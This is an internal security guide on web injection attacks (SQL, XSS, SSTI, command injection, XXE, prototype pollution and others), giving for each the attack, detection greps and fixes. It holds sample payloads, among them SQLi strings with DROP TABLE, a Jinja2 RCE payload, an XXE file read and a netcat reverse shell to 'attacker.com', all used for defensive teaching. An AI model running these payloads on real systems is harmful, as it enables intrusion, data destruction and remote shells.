# 02 - Injection attacks

User input becoming code, query, or markup. The oldest class of web vuln, still in OWASP Top 10 every year. The categories overlap; the principle is the same: input is data, code is code, and the gap between them is where attackers live.

## 2.1 SQL injection (SQLi)

**Attack.** User input is concatenated into a SQL query. Attacker sends input that closes the literal and adds clauses. Variants:

- **In-band / classic.** Result shows up in the response. `' OR 1=1 --`. `' UNION SELECT password FROM users --`.
- **Blind boolean.** No data in response, but response changes based on truthy/falsy injected condition. `' AND SUBSTRING(password, 1, 1) = 'a' --` repeated.
- **Blind time-based.** No response difference except timing. `'; WAITFOR DELAY '0:0:5' --` or `' OR SLEEP(5) --`. Slow but works against any query.
- **Out-of-band.** Exfiltrate via DNS lookup, HTTP callback, file write.
- **Second-order.** Injection stored in DB on one request, executed on a later request when the stored value is used in another query.
- **Stacked queries.** `; DROP TABLE users; --` if the DB driver supports multiple statements.

**Real cases:**

- 2024 MOVEit Transfer (CVE-2023-34362): SQLi → mass data exfiltration. ~2,700 organizations breached, including BBC, British Airways, US Department of Energy. Cl0p ransomware group.
- Recurring in WordPress plugins, low-quality SaaS, custom CMS.
- LLM-generated code is a fresh source of SQLi. Code generators sometimes interpolate user input directly when prompted carelessly.

**Detection.**

```bash
# pattern hunt
grep -rEn 'query\(.+\+|raw\(|execute\(.+\+|\$\{.+\}.*FROM|`.*SELECT.*\$\{' backend/

# popular tools
sqlmap -u 'https://api.spectreai.io/articles?id=1' --batch --random-agent
# WARNING: only run sqlmap against systems you own or have written permission to test
```

**Fix.**

- Parameterized queries everywhere. Every modern ORM does this by default. Prisma, Drizzle, SQLAlchemy, Sequelize, Mongoose, Diesel - all safe by default.
- If you find raw SQL with template literals interpolating user input, that's the bug. Convert to parameters:
  ```js
  // BROKEN
  db.query(`SELECT * FROM articles WHERE id = ${req.params.id}`)
  // FIXED
  db.query('SELECT * FROM articles WHERE id = $1', [req.params.id])
  ```
- Schema-validate input before the DB layer (Zod, Pydantic, Joi).
- Least-privilege DB user. The app user does not need DROP TABLE.
- WAF can catch many SQLi patterns but is the last line, not the first.

---

## 2.2 NoSQL injection

**Attack.** Same idea, different syntax. MongoDB query operators (`$ne`, `$gt`, `$where`) accept JSON. If user input is passed as a parsed object instead of a scalar, an attacker sends `{"$ne": null}` and matches everything.

```js
// BROKEN - req.body.username can be { "$ne": null }
db.users.findOne({ username: req.body.username, password: req.body.password })
// Returns the first user whose password is not null
```

**Fix.** Cast user input to expected scalar types (`String(req.body.username)`). Or validate against a schema.

NoSQL injection also enables:
- Operator injection (`$where` runs JS)
- Server-side request forgery via `$lookup`
- Authentication bypass

---

## 2.3 ORM and GraphQL injection

ORMs are usually safe but expose escape hatches that aren't:

- Prisma `$queryRaw` and `$executeRaw` accept raw strings. Use `$queryRawUnsafe` only in tests.
- Sequelize `sequelize.query` with `replacements: {}` is safe; with string concatenation it's not.
- TypeORM `query()` is raw.

**GraphQL specific:**

- **Introspection in production.** Lets attackers enumerate the entire schema and discover undocumented mutations. Disable in prod.
- **Batching attacks.** Bundle 1000 password-reset queries in one request to bypass per-request rate limits. Limit batch size or rate-limit by query cost, not request count.
- **Depth attacks.** Deeply nested queries that explode cost. `user { posts { comments { author { posts { comments { ... } } } } } }`. Add depth and complexity limits (graphql-depth-limit, graphql-query-complexity).
- **Field suggestions in error messages.** When a field is misspelled, GraphQL helpfully suggests close matches. This leaks schema even with introspection off. Disable in prod.

---

## 2.4 Cross-site scripting (XSS)

Probably the highest-impact class for Spectre because of the Web3 angle: a single stored XSS on a wallet-connected page is a drainer. See `07-web3-and-defi.md`.

**Three classic flavors:**

- **Stored XSS.** Payload saved to DB, rendered to other users. Comment field, username, article body, profile description.
- **Reflected XSS.** Payload in URL or form input, reflected back unescaped. Phishing-link delivery.
- **DOM XSS.** Pure client-side. Code reads from `location.hash`, `document.referrer`, `postMessage`, etc. and pipes it into `innerHTML`, `eval`, `setTimeout(string)`, `dangerouslySetInnerHTML`, or `Function()`.

**Less obvious flavors:**

- **Mutation XSS (mXSS).** Browser parsing differs from sanitizer parsing. Sanitizer thinks payload is safe; browser, during DOM parsing, re-arranges it into something exploitable. DOMPurify defends against most known mXSS patterns; outdated sanitizers don't.
- **Self-XSS.** Attacker tricks user into pasting JS into their own console. Defended by the warning Chrome shows in DevTools. Mostly social engineering, not a code defect.
- **Universal XSS.** Browser bug that lets one origin execute in another. Browser vendor's problem.
- **XSS via SVG, MathML, or HTML email.** Same principles, different sinks.

**Detection.** Search for dangerous sinks:

```bash
grep -rEn "dangerouslySetInnerHTML|innerHTML\s*=|outerHTML\s*=" src/
grep -rEn "\beval\(|new Function\(|setTimeout\([\"']|setInterval\([\"']" src/
grep -rEn "document\.write\(" src/
grep -rEn "v-html|{@html|\[innerHTML\]" src/
grep -rEn "location\.hash|document\.referrer|postMessage" src/  # DOM XSS sources
```

Every match: audit where the input comes from.

**Fix.**

- Use React/Vue/Svelte default escaping. Don't fight the framework.
- DOMPurify before any HTML output, including for `dangerouslySetInnerHTML`:
  ```js
  import DOMPurify from 'dompurify'
  <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(html)}} />
  ```
- Strict Content Security Policy. Minimum:
  ```
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-{random}';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' https://api.spectreai.io;
    object-src 'none';
    base-uri 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
    block-all-mixed-content;
  ```
- No `'unsafe-inline'` or `'unsafe-eval'` in `script-src`. Use nonces for legitimate inline scripts.
- `Trusted-Types` header on supporting browsers: forces all DOM-XSS sinks to receive a typed object, rejecting raw strings.
- Encode for the right context: HTML, attribute, JS, CSS, URL. Don't HTML-encode for JS contexts.
- Server-side input validation. Client validation is UX.

**Spectre action items:**

1. Verify CSP is set across spectreai.io and the research/trading apps
2. Add DOMPurify wherever `dangerouslySetInnerHTML` is used
3. CSP report-uri pointing to a Cloudflare worker that logs to PostHog or similar

---

## 2.5 CSRF (Cross-Site Request Forgery)

**Attack.** User is logged in. Attacker tricks them into visiting a page (or clicking a link, or loading an image with a clever src) that issues a state-changing request to your app. The browser attaches the session cookie automatically. Your server sees an authenticated request and acts on it.

**Detection.** State-changing endpoints that:
- Accept GET requests for side effects (never do this)
- Use cookies for auth but lack a `SameSite` attribute
- Don't check Origin/Referer or a CSRF token

**Fix.**

- `SameSite=Lax` (default) or `Strict` on session cookies. Lax allows top-level navigations, Strict blocks them.
- `HttpOnly` (no JS access) and `Secure` (HTTPS only) flags.
- For non-cookie auth (Bearer tokens in `Authorization` header), CSRF is structurally impossible because other origins can't read the token.
- For cookie auth with mutating endpoints, use a double-submit token or origin-bound CSRF token. Most modern frameworks have this built in.

---

## 2.6 Server-Side Template Injection (SSTI)

**Attack.** Application takes user input and renders it through a server-side template engine (Jinja2, Handlebars, Twig, Velocity, ERB, FreeMarker, Pug). If input becomes part of the template syntax, attacker can execute template logic, which often allows RCE.

```
# Jinja2 (Flask)
{{7*7}} → 49 (confirms injection)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}} → RCE
```

**Detection.**

- Look for template engines used with user input: any `render(template_string + user_input)` or `render(f"...{user_input}...")`.
- Test inputs: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`. If 49 appears, you have SSTI.

**Fix.**

- Never concatenate user input into a template string. Pass it as a variable to a static template:
  ```python
  # BROKEN
  return render_template_string(f"Hello {request.args.get('name')}")
  # FIXED
  return render_template_string("Hello {{ name }}", name=request.args.get('name'))
  ```
- Use sandboxed template environments where the engine supports them (Jinja2 SandboxedEnvironment, but note: even these have escape histories).

---

## 2.7 Command injection

**Attack.** User input becomes part of a shell command. `; rm -rf /` style. Modern equivalents include `os.system`, `subprocess.call(shell=True)`, `child_process.exec`, backticks in Ruby, `Runtime.exec` in Java.

```js
// BROKEN
exec(`convert ${userImage} output.png`)
// User sends "x.png; nc attacker.com 4444 -e /bin/sh"
```

**Detection.**

```bash
grep -rEn 'exec\(|spawn\(|child_process|subprocess.*shell=True|os\.system' .
```

**Fix.** Don't shell out. Use language-native APIs. If you must shell out, use the array-arguments form, never the string form:

```js
// BROKEN
exec(`ffmpeg -i ${userFile} out.mp4`)
// SAFE
spawn('ffmpeg', ['-i', userFile, 'out.mp4'])
```

Validate input shape (filename matches `[a-zA-Z0-9_.-]+`, no slashes, no shell metacharacters).

---

## 2.8 Prototype pollution

**Attack.** JavaScript objects inherit from `Object.prototype`. If application code recursively merges user-controlled JSON into an object without filtering `__proto__`, `constructor`, or `prototype`, attacker writes a property to `Object.prototype`. Every object in the app then inherits it.

Consequences:
- Privilege escalation: `{"__proto__": {"isAdmin": true}}` and every later code path that checks `if (user.isAdmin)` returns true.
- DoS: pollute methods like `toString` to throw.
- RCE via gadget chains. Polluted property feeds into a sink like template rendering, child_process options, or sandbox configuration. Per the Silent Spring research, this has hit Kibana, Mongoose, Parse Server, and others.

**Real cases:**

- CVE-2024-21505 in `tarn` (used by Knex.js DB pool)
- CVE-2025-57820 in `devalue` (used by SvelteKit)
- CVE-2025-13465 in lodash `_.unset` / `_.omit`
- Long history in lodash (`_.merge`, `_.defaultsDeep`, `_.set`), jQuery, hoek, deep-extend.

**Detection.**

```bash
grep -rEn '_\.(merge|mergeWith|defaultsDeep|set|setWith)' src/
grep -rEn 'extend\(|deepClone|deepMerge|recursivelyMerge' src/
grep -rEn 'JSON\.parse\(.*req\.(body|query|params)' src/
```

If user-controlled JSON flows into any deep-merge function, audit hard.

**Fix.**

- `Object.create(null)` for any object that holds untrusted data. Has no prototype chain.
- `Map` instead of plain object for key-value stores keyed by user input.
- Schema-validate input before merge (Zod, Ajv): reject `__proto__`, `constructor`, `prototype` keys.
- `Object.freeze(Object.prototype)` at app startup. Nuclear option but effective; some libraries break.
- Keep dependencies current; lodash, devalue, tarn have all shipped patches.
- Pin Node.js to a version with `--disable-proto=delete` if your app tolerates it.

---

## 2.9 HTTP request smuggling (desync)

**Attack.** Front-end proxy (Cloudflare, nginx, load balancer) and back-end server disagree on where one HTTP request ends. Attacker crafts a request that the front-end sees as one but the back-end splits into two. The smuggled second request gets processed in someone else's connection, can hijack a session, poison a cache, or bypass WAF rules.

Variants (terminology: front-end behavior dot back-end behavior):

- **CL.TE.** Front-end uses Content-Length, back-end uses Transfer-Encoding.
- **TE.CL.** The reverse.
- **TE.TE.** Both use TE, but one is fooled by a malformed TE header into ignoring it.
- **H2.CL / H2.TE.** HTTP/2 to HTTP/1 downgrade smuggling. Front-end speaks H2, back-end is H1, and H2 doesn't have CL/TE the same way. James Kettle's 2021/2022/2025 research.

**Real cases:**

- CVE-2025-32094: HTTP request smuggling via OPTIONS + obsolete line folding (2025).
- James Kettle's "HTTP/1.1 must die: the desync endgame" (2025): broad classes of new desync against modern stacks.
- Numerous bug bounty disclosures: cache-poisoning $5K-$50K bounties at large platforms.

**Detection.**

- Burp Suite Pro's HTTP Request Smuggler extension.
- `smuggler` (CLI tool by defparam).
- Look for: front-end nginx + back-end Express, or any chain where two HTTP implementations parse requests differently.

**Fix.**

- HTTP/2 end-to-end. Don't downgrade to HTTP/1 between front-end and back-end.
- Same HTTP parser everywhere if possible.
- Reject ambiguous requests (both CL and TE, malformed TE, obsolete line folding).
- Cloudflare patches the front-end side for you; the issue is usually back-end behind Cloudflare. Verify your origin (Vercel, etc.) rejects ambiguous requests.

You aren't likely to introduce this yourself; you inherit it from infrastructure. The detection step is the one to do.

---

## 2.10 Web cache poisoning

**Attack.** Attacker sends a request that the cache stores under a key shared with legitimate users. Later requests with the same cache key get the poisoned response. Often chained with request smuggling or with abuse of unkeyed headers (`X-Forwarded-Host`, `X-Original-URL`).

**Example.** Cache key is just `/style.css`. Attacker sends `/style.css` with `X-Forwarded-Host: attacker.com`. App generates HTML based on `X-Forwarded-Host`, includes an attacker-controlled URL. Cache stores it. Every subsequent user gets the poisoned response.

**Fix.**

- Include all request-influencing headers in the cache key (Vary header or explicit cache config).
- Strip unkeyed headers at the cache edge.
- Audit which headers your app reads. `X-Forwarded-*`, `Host`, `Origin`, `Referer` should be ignored or normalized.

Cloudflare handles a lot of this. Vercel's edge cache also handles it. The risk is when your app behind them does something weird with `X-Forwarded-*`.

---

## 2.11 XXE (XML External Entity)

**Attack.** XML parser resolves external entities by default. Attacker submits an XML document with an entity that fetches `file:///etc/passwd` or `http://internal-service/`. Server reads the file or makes the request.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Fix.** Disable external entity resolution in your XML parser. Modern libraries default to safe in most languages now (libxml2 since 2.9.0; .NET, Java, Python require explicit configuration).

You're React + Node, you don't parse XML often. If you do (SAML, RSS, SOAP), audit.

---

## 2.12 Insecure deserialization

**Attack.** App deserializes untrusted data into a typed object. The deserialization process invokes constructors, magic methods, or property setters. Attacker crafts a serialized blob that triggers a chain of legal operations ending in code execution. Most famously:

- Java: `ObjectInputStream`. Gadget chains via commons-collections, Spring, etc. Lots of CVEs.
- PHP: `unserialize()`. Magic methods like `__wakeup`, `__destruct`.
- .NET: `BinaryFormatter`. Removed in .NET 9 because it's structurally unsafe.
- Python: `pickle`. Never deserialize untrusted pickle.
- Node.js: serialization libraries like `node-serialize`, `funcster`. Avoid the user-input-into-deserialize pattern.

**Fix.**

- Use JSON. JSON is data, not code. Schema-validate on the way in.
- If you need typed serialization, use formats with no code execution (Protocol Buffers, MessagePack, FlatBuffers).
- If you must use language-native serialization, sign it (HMAC) and verify the signature before deserializing.

---

## 2.13 Regular expression DoS (ReDoS)

**Attack.** Regex engine has catastrophic backtracking on certain inputs. Attacker submits input that makes a single regex take seconds or minutes. Stalls request handlers, exhausts CPU.

Classic vulnerable pattern: `(a+)+$` against input `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`. Most JS regex engines and Python's `re` use NFA-with-backtracking and are vulnerable.

**Detection.**

- Audit regexes for nested quantifiers, alternation with overlap, optional groups.
- Tools: `safe-regex`, `vuln-regex-detector`, `regex-static-analysis`.
- For Node.js: `--enable-source-maps` with timing tests.

**Fix.**

- Use linear-time regex engines (RE2, Hyperscan, Rust's regex crate) for untrusted input.
- Validate input length before regex.
- Timeout regex execution (`pcre.jit_stack_size`, language-specific).
- Replace complex regex with parsers for non-trivial input (e.g., a real URL parser, not regex).

---

## 2.14 Open redirects

**Attack.** Your app has a redirect endpoint (`/login?next=/dashboard`) that doesn't validate the destination. Attacker sends `/login?next=https://phishing-site.io`. User logs in, gets redirected to phishing site that mimics yours, asks for re-auth or wallet signature.

**Fix.** Allowlist destinations:

```js
const next = searchParams.get('next') ?? '/'
const safe = next.startsWith('/') && !next.startsWith('//') ? next : '/'
```

Or check against a hardcoded list of allowed paths. Never redirect to a destination derived from user input without this check.

---

## 2.15 LDAP, XPath, NoSQL operator, ORM injection cousins

Same idea, different query language. Search the codebase for any case where user input is concatenated into a query. Use the parameterization equivalent for your query language.

- LDAP: escape per RFC 4515.
- XPath: parameterized XPath libraries (XPath 3.0 has them).
- MongoDB: cast scalars, don't accept objects from user input directly.

---

## 2.16 Header injection (CRLF)

**Attack.** User input becomes a response header. If newlines are allowed through, attacker injects `\r\n` to add new headers or split the response. Used for cache poisoning, XSS via injected `Content-Type`, and session fixation via injected `Set-Cookie`.

**Fix.** Reject `\r` and `\n` in any user-controlled header value. Most frameworks do this by default; check if you're setting headers manually.

Specific case: **host header injection** in password reset. User clicks "forgot password" with `Host: attacker.com`. App emails a reset link `https://attacker.com/reset?token=...`. User clicks, attacker captures the token.

Fix: hardcode your domain in password reset links. Don't construct them from request headers.

---

## 2.17 Common detection commands

Run these against the Spectre codebase periodically:

```bash
# all the dangerous JS patterns in one pass
rg -n 'eval\(|new Function\(|setTimeout\([\"'\'']|innerHTML\s*=|dangerouslySetInnerHTML|document\.write\(' src/

# template literals with user input near SQL
rg -n '`.*SELECT.*\$\{|`.*INSERT.*\$\{|`.*UPDATE.*\$\{|`.*DELETE.*\$\{' .

# shell-out patterns
rg -n 'exec\(|spawn\(|child_process|os\.system' .

# unsafe deep-merge
rg -n 'lodash.*merge|deepMerge|deepClone|extend\(.*req\.' src/

# host header trust
rg -n 'req\.(headers\.host|hostname)' .
```

---

## 2.18 Further reading

- PortSwigger Web Security Academy (gold standard, free): https://portswigger.net/web-security
- OWASP Cheat Sheets: SQL Injection, XSS Prevention, DOM-based XSS, SSTI: https://cheatsheetseries.owasp.org/
- Silent Spring (prototype pollution → RCE in Node.js): https://www.usenix.org/system/files/sec23summer_432-shcherbakov-prepub.pdf
- HTTP Request Smuggling research by James Kettle: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
